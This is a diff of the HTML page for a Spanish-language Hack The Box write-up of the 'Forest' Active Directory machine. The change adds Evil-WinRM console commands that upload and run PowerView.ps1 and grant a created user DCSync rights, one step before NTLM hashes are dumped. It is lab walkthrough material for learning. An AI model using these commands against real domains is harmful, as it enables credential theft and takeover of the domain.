@@ -19,7 +19,7 @@
 <meta itemprop=name content="Forest">
 <meta itemprop=description content="Hack The Box. Windows. Máquina fácil. Esta máquina presenta un entorno de Active Directory (AD) para realizar enumeración de MS RPC, AS-REProasting, descrifrado de contraseñas, DCSync y Pass the Hash. Para comprometer la máquina se necesitan conocer técnicas básicas de enumeración y explotación de AD, además de usar BloodHound"><meta itemprop=datePublished content="2020-03-21T00:00:00+01:00">
 <meta itemprop=dateModified content="2020-03-21T00:00:00+01:00">
-<meta itemprop=wordCount content="1430">
+<meta itemprop=wordCount content="1461">
 <meta itemprop=keywords content="bloodhound,pass-the-hash,msrpc,dcsync,as-reproasting,active-directory,hash-cracking,">
 <meta name=twitter:card content="summary">
 <meta name=twitter:title content="Forest">
@@ -385,8 +385,16 @@ The command completed successfully.
 </code></pre></div><p>Luego, añadimos este nuevo usuario al grupo <code>Exchange Windows Permissions</code>:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>*Evil-WinRM* PS C:\Windows\Temp\privesc&gt; net group &#34;Exchange Windows Permissions&#34; rocky /add
 The command completed successfully.
-</code></pre></div><p>Ahora que tenemos un usuario válido miembro del grupo <code>Exchange Windows Permissions</code>, tenemos permisos para modificar la DACL (<em>Directory Access Control List</em>) del dominio <code>htb.local</code> (mostrado en BloodHound como <code>WriteDacl</code>). Básicamente, podemos otorgar cualquier privilegio al usuario <code>rocky</code>. BloodHound muestra una lista de comandos para ejecutar esta tarea:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>*Evil-WinRM* PS C:\Windows\Temp\privesc&gt; $SecPassword = ConvertTo-SecureString &#39;7rocky7rocky&#39; -AsPlainText -Force
+</code></pre></div><p>Ahora que tenemos un usuario válido miembro del grupo <code>Exchange Windows Permissions</code>, tenemos permisos para modificar la DACL (<em>Directory Access Control List</em>) del dominio <code>htb.local</code> (mostrado en BloodHound como <code>WriteDacl</code>). Básicamente, podemos otorgar cualquier privilegio al usuario <code>rocky</code>. BloodHound muestra una lista de comandos para ejecutar esta tarea (es necesario descargar <a href=https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1><code>PowerView.ps1</code></a> en la máquina):</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>*Evil-WinRM* PS C:\Windows\Temp\privesc&gt; upload PowerView.ps1
+Info: Uploading PowerView.ps1 to C:\Windows\Temp\privesc\PowerView.ps1
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>Data: 770279 bytes of 770279 bytes copied
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>Info: Upload successful!
+*Evil-WinRM* PS C:\Windows\Temp\privesc&gt; .\PowerView.ps1
+*Evil-WinRM* PS C:\Windows\Temp\privesc&gt; $SecPassword = ConvertTo-SecureString &#39;7rocky7rocky&#39; -AsPlainText -Force
 *Evil-WinRM* PS C:\Windows\Temp\privesc&gt; $Cred = New-Object System.Management.Automation.PSCredential(&#39;htb.local\rocky&#39;, $SecPassword)
 *Evil-WinRM* PS C:\Windows\Temp\privesc&gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity &#34;DC=htb,DC=local&#34; -PrincipalIdentity rocky -Rights DCSync
 </code></pre></div><p>Entonces, podemos realizar un ataque DCSync com Mimikatz o <code>secretsdump.py</code> de Impacket para extraer todos los <em>hashes</em> NTLM de los usuarios del dominio (almacenados en el archivo <code>NTDS.dit</code>).</p>
